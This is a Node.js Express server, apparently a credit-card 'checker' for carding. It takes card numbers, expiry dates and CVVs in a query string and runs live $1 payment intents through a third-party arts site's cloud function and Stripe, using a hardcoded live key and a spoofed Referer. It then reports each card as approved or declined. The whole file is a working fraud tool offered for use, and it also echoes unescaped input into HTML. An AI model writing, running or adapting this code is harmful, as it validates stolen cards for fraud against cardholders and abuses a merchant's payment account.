const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 10000;

const STRIPE_PK = 'pk_live_51QVIZEBQDKIMdEl0TH6zoYwCH8E5Q1XyxJ73HNSqz7kWQUDPelsHHplSQnRUDzQGkoC2PtEqKqhgT9pkltge0jaB00C63zAYQm';
const ARTSPAN_API = 'https://us-central1-artspanapp.cloudfunctions.net/createPaymentIntent';

app.get('/', (req, res) => {
    res.send('<h1>Checker API is Online</h1><p>Use: /chk?card=num|mm|yyyy|cvv</p>');
});

// --- NEW BROWSER-FRIENDLY GET ROUTE ---
app.get('/chk', async (req, res) => {
    const cardParam = req.query.card;

    if (!cardParam) {
        return res.send('<h2>❌ Error: No card data provided.</h2><p>Usage: /chk?card=4283322085859286|06|2026|097</p>');
    }

    const [num, mon, year, cvv] = cardParam.split('|').map(i => i.trim());

    try {
        // 1. Get Secret
        const intent = await axios.post(ARTSPAN_API, {
            amount: 100, email: "browser_test@test.com", live: true
        });
        const secret = intent.data.clientSecret;

        // 2. Handshake
        const confirm = await axios.post(`https://api.stripe.com/v1/payment_intents/${secret.split('_secret')[0]}/confirm`, 
            new URLSearchParams({
                'payment_method_data[type]': 'card',
                'payment_method_data[card][number]': num,
                'payment_method_data[card][cvc]': cvv,
                'payment_method_data[card][exp_month]': parseInt(mon),
                'payment_method_data[card][exp_year]': parseInt(year),
                'key': STRIPE_PK,
                'client_secret': secret
            }).toString(),
            { headers: { 'Referer': 'https://www.artspan.org/' } }
        ).catch(e => e.response);

        const data = confirm.data;

        // --- RENDER HTML RESPONSE ---
        let statusColor = data.status === 'succeeded' ? 'green' : 'red';
        let resultTitle = data.status === 'succeeded' ? '✅ Approved' : '❌ Declined';
        let message = data.error ? data.error.message : 'Transaction Successful';

        res.send(`
            <div style="font-family: sans-serif; padding: 20px; border: 2px solid ${statusColor}; border-radius: 10px; max-width: 400px; margin: 50px auto; text-align: center;">
                <h1 style="color: ${statusColor};">${resultTitle}</h1>
                <p><b>Card:</b> ${num}</p>
                <p><b>Bank Response:</b> ${message}</p>
                <p><b>Code:</b> ${data.error ? (data.error.decline_code || 'generic_decline') : 'success'}</p>
                <hr>
                <small>Result generated at: ${new Date().toLocaleString()}</small>
            </div>
        `);

    } catch (err) {
        res.status(500).send(`<h2>❌ System Error</h2><p>${err.message}</p>`);
    }
});

app.listen(PORT, () => console.log(`Browser API live on ${PORT}`));
